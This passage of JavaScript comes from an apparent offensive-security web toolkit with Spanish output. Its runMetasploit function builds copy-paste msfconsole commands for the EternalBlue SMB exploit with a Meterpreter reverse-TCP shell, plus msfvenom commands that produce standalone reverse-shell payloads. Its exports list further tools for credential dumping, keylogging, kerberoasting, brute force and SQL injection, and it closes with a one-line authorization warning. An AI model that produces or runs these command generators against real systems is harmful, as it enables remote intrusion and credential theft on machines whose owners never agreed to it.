        lines.push('  - e2.sh para Windows targets');
        lines.push('  - Dependencias: Netcat, Curl, Metasploit');
        lines.push('  - Deploya JSP shell y permite upload/command execution');
        lines.push('');
        lines.push('-'.repeat(50));
        lines.push('WARN: solo ataca sistemas con autorizacion escrita');
        setOutput('jbossResult', lines.join('<br>'));
    }, 400);
}

// ============================================================
// METASPLOIT
// ============================================================
function runMetasploit() {
    var target = ($('msfTarget') ? $('msfTarget').value : '').trim() || '192.168.1.10';
    var port = ($('msfPort') ? $('msfPort').value : '').trim() || '445';
    var module = ($('msfModule') ? $('msfModule').value : 'exploit/windows/smb/ms17_010_eternalblue');
    var payload = ($('msfPayload') ? $('msfPayload').value : 'windows/x64/meterpreter/reverse_tcp');
    var lhost = ($('msfLhost') ? $('msfLhost').value : '').trim() || '192.168.1.50';
    var lport = ($('msfLport') ? $('msfLport').value : '').trim() || '4444';
    setOutput('msfResult', 'Generando comandos Metasploit...');
    setTimeout(function() {
        var lines = [];
        lines.push('='.repeat(50));
        lines.push('  METASPLOIT');
        lines.push('  Target: ' + esc(target));
        lines.push('  Puerto: ' + esc(port));
        lines.push('  Modulo: ' + esc(module));
        lines.push('  Payload: ' + esc(payload));
        lines.push('  LHOST: ' + esc(lhost));
        lines.push('  LPORT: ' + esc(lport));
        lines.push('='.repeat(50));
        lines.push('');
        lines.push('[Tool] Metasploit Framework');
        lines.push('  Install: curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall');
        lines.push('  chmod 755 msfinstall && ./msfinstall');
        lines.push('');
        lines.push('Flujo completo (copiar y pegar en msfconsole):');
        lines.push(codeBlock('msfconsole'));
        lines.push(codeBlock('use ' + module));
        lines.push(codeBlock('set RHOSTS ' + target));
        lines.push(codeBlock('set RPORT ' + port));
        lines.push(codeBlock('set PAYLOAD ' + payload));
        lines.push(codeBlock('set LHOST ' + lhost));
        lines.push(codeBlock('set LPORT ' + lport));
        lines.push(codeBlock('show options'));
        lines.push(codeBlock('run'));
        lines.push('');
        lines.push('Comando one-liner (sin consola interactiva):');
        lines.push(codeBlock('msfconsole -q -x "use ' + module + '; set RHOSTS ' + target + '; set RPORT ' + port + '; set PAYLOAD ' + payload + '; set LHOST ' + lhost + '; set LPORT ' + lport + '; run; exit"'));
        lines.push('');
        lines.push('Generar payload standalone:');
        lines.push(codeBlock('msfvenom -p ' + payload + ' LHOST=' + lhost + ' LPORT=' + lport + ' -f exe -o payload.exe'));
        lines.push(codeBlock('msfvenom -p ' + payload + ' LHOST=' + lhost + ' LPORT=' + lport + ' -f elf -o payload.elf'));
        lines.push(codeBlock('msfvenom -p ' + payload + ' LHOST=' + lhost + ' LPORT=' + lport + ' -f raw -o payload.raw'));
        lines.push('');
        lines.push('[Notes]');
        lines.push('  - Metasploit Framework es una suite completa de exploits');
        lines.push('  - 2000+ exploits, 1000+ payloads');
        lines.push('  - Modulos auxiliares para scanning y post-explotacion');
        lines.push('  - Meterpreter para post-explotacion avanzada');
        lines.push('');
        lines.push('-'.repeat(50));
        lines.push('WARN: solo ataca sistemas con autorizacion escrita');
        setOutput('msfResult', lines.join('<br>'));
    }, 400);
}

// ============================================================
// EXPORTAR FUNCIONES GLOBALES
// ============================================================
window.showTool = showTool;
window.downloadTool = downloadTool;
window.runHostInfo = runHostInfo;
window.runIdentityInfo = runIdentityInfo;
window.runNetworkInfo = runNetworkInfo;
window.runDnsInfo = runDnsInfo;
window.runWebScanning = runWebScanning;
window.runVulnScanning = runVulnScanning;
window.runWebVulnScanning = runWebVulnScanning;
window.runBluetoothScanning = runBluetoothScanning;
window.runRadioScanning = runRadioScanning;
window.runWifiScanning = runWifiScanning;
window.runCredentialDumping = runCredentialDumping;
window.runHashIdentification = runHashIdentification;
window.runWordlistProfiling = runWordlistProfiling;
window.runBruteForce = runBruteForce;
window.runPasswordCracking = runPasswordCracking;
window.runUnsecuredCredentials = runUnsecuredCredentials;
window.runWifiCredentialAccess = runWifiCredentialAccess;
window.runKeylogger = runKeylogger;
window.runVoipCredentialAccess = runVoipCredentialAccess;
window.runLibNFC = runLibNFC;
window.runNfcMfclassic = runNfcMfclassic;
window.runKerberoast = runKerberoast;
window.runKrbRelayX = runKrbRelayX;
window.runDnsRebind = runDnsRebind;
window.runSqlmap = runSqlmap;
window.runSqlninja = runSqlninja;
window.runSqlsus = runSqlsus;
window.runJsqlInjection = runJsqlInjection;
window.runCommix = runCommix;
window.runJbossLinux = runJbossLinux;
window.runJbossAutopwn = runJbossAutopwn;
window.runMetasploit = runMetasploit;

// ============================================================
// INICIALIZACIÓN
// ============================================================
document.addEventListener('DOMContentLoaded', function() {
    console.log('OK: MFH TOOLS - script-tools.js cargado correctamente');
    console.log('Tools disponibles: ' + AVAILABLE_TOOLS.length);
    console.log('Reconnaissance: 10 herramientas');
    console.log('Credential Access: 13 herramientas');
    console.log('Initial Access: 9 herramientas');
});
